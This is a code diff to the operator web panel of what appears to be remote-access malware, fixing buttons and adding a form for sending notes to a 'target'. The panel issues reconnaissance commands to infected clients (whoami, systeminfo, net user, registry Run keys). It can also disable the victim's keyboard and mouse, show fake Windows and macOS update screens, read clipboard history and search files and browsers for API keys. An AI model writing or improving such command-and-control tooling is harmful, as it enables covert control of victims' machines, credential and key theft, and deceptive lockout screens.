@@ -356,26 +356,26 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <span class="close-btn" onclick="closeModal()">&times;</span>
 </div>
 <div class="cmd-grid">
-<button class="cmd-btn" onclick="sendCmd('whoami')">whoami <span>Current user</span></button>
-<button class="cmd-btn" onclick="sendCmd('hostname')">hostname <span>Machine name</span></button>
-<button class="cmd-btn" onclick="sendCmd('systeminfo')">systeminfo <span>Full system info</span></button>
-<button class="cmd-btn" onclick="sendCmd('ipconfig /all')">ipconfig /all <span>Network config</span></button>
-<button class="cmd-btn" onclick="sendCmd('netstat -an')">netstat -an <span>Active connections</span></button>
-<button class="cmd-btn" onclick="sendCmd('tasklist')">tasklist <span>Running processes</span></button>
-<button class="cmd-btn" onclick="sendCmd('dir')">dir <span>List files</span></button>
-<button class="cmd-btn" onclick="sendCmd('dir %USERPROFILE%')">dir %USERPROFILE% <span>User home files</span></button>
-<button class="cmd-btn" onclick="sendCmd('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')">Registry Run Keys <span>Startup programs</span></button>
-<button class="cmd-btn" onclick="sendCmd('net user')">net user <span>List users</span></button>
-<button class="cmd-btn" onclick="sendCmd('qwinsta')">qwinsta <span>Remote sessions</span></button>
-<button class="cmd-btn" onclick="sendCmd('schtasks /query /fo LIST')">Scheduled Tasks <span>Task scheduler</span></button>
-<button class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('DISABLE_INPUT')">🚫 Disable Input <span>Block keyboard + mouse (admin)</span></button>
-<button class="cmd-btn" style="background:#0a1a0a;border-color:#4CAF50;" onclick="sendCmd('ENABLE_INPUT')">✅ Enable Input <span>Restore keyboard + mouse</span></button>
-<button class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('WINDOWS_UPDATE')">🪟 Windows Update <span>Fake Windows updating screen</span></button>
-<button class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Apple Update <span>Fake macOS updating screen</span></button>
-<button class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
-<button class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
-<button class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
-<button class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('whoami')">whoami <span>Current user</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('hostname')">hostname <span>Machine name</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('systeminfo')">systeminfo <span>Full system info</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('ipconfig /all')">ipconfig /all <span>Network config</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('netstat -an')">netstat -an <span>Active connections</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('tasklist')">tasklist <span>Running processes</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('dir')">dir <span>List files</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('dir %USERPROFILE%')">dir %USERPROFILE% <span>User home files</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')">Registry Run Keys <span>Startup programs</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('net user')">net user <span>List users</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('qwinsta')">qwinsta <span>Remote sessions</span></button>
+<button type="button" class="cmd-btn" onclick="sendCmd('schtasks /query /fo LIST')">Scheduled Tasks <span>Task scheduler</span></button>
+<button type="button" class="cmd-btn" style="background:#1a0a0a;border-color:#f44336;" onclick="sendCmd('DISABLE_INPUT')">🚫 Disable Input <span>Block keyboard + mouse (admin)</span></button>
+<button type="button" class="cmd-btn" style="background:#0a1a0a;border-color:#4CAF50;" onclick="sendCmd('ENABLE_INPUT')">✅ Enable Input <span>Restore keyboard + mouse</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a3a;border-color:#2196F3;" onclick="sendCmd('WINDOWS_UPDATE')">🪟 Windows Update <span>Fake Windows updating screen</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a1a;border-color:#999;" onclick="sendCmd('APPLE_UPDATE')">🍎 Apple Update <span>Fake macOS updating screen</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a0a;border-color:#f44336;" onclick="sendCmd('HIDE_UPDATE')">❌ Hide Update <span>Close update screen</span></button>
+<button type="button" class="cmd-btn" style="background:#1a1a0a;border-color:#ffd700;" onclick="sendCmd('CLIPBOARD_LOG')">📋 Clipboard Log <span>View copied text history</span></button>
+<button type="button" class="cmd-btn" style="background:#0a0a2a;border-color:#ff9800;" id="btnFindApi" onclick="sendCmd('FIND_API_KEYS')">🔑 Find API Keys <span>Search files/browsers for keys</span></button>
+<button type="button" class="cmd-btn" style="background:#0a2a0a;border-color:#4CAF50;" onclick="openNoteModal()">📝 Send Note <span>Open notepad with custom text</span></button>
 </div>
 </div>
 </div>
@@ -387,10 +387,14 @@ th{background:#16213e;color:#ffd700;}tr:hover{background:#222;}
 <h2>📝 Send Note to Target</h2>
 <span class="close-btn" onclick="closeNoteModal()">&times;</span>
 </div>
+<form id="noteForm" method="POST" action="/send_command">
+<input type="hidden" name="client_id" id="noteClientId">
+<input type="hidden" name="command" id="noteCommand">
 <textarea id="noteText" style="width:100%;height:200px;background:#1a1a2e;color:#fff;border:1px solid #333;border-radius:6px;padding:10px;font-family:monospace;font-size:13px;resize:vertical;box-sizing:border-box;" placeholder="Type your note here..."></textarea>
 <div style="margin-top:15px;text-align:right;">
-<button class="btn" style="background:#4CAF50;color:#fff;" onclick="sendNote()">Send Note</button>
+<button type="button" class="btn" style="background:#4CAF50;color:#fff;" onclick="sendNote()">Send Note</button>
 </div>
+</form>
 </div>
 </div>
 
@@ -413,7 +417,9 @@ function sendCmd(cmd) {
     form.submit();
 }
 function openNoteModal() {
+    if (!activeClientId) { alert('Please select a client first'); return; }
     closeModal();
+    document.getElementById('noteClientId').value = activeClientId;
     document.getElementById('noteModal').style.display = 'block';
     document.getElementById('noteText').value = '';
     document.getElementById('noteText').focus();
@@ -424,10 +430,8 @@ function closeNoteModal() {
 function sendNote() {
     var text = document.getElementById('noteText').value;
     if (!text.trim()) { alert('Enter some text first'); return; }
-    closeNoteModal();
-    var form = document.getElementById('form-' + activeClientId);
-    form.querySelector('input[name=\"command\"]').value = 'NOTE|' + text;
-    form.submit();
+    document.getElementById('noteCommand').value = 'NOTE|' + text;
+    document.getElementById('noteForm').submit();
 }
 window.onclick = function(event) {
     var modal = document.getElementById('quickModal');
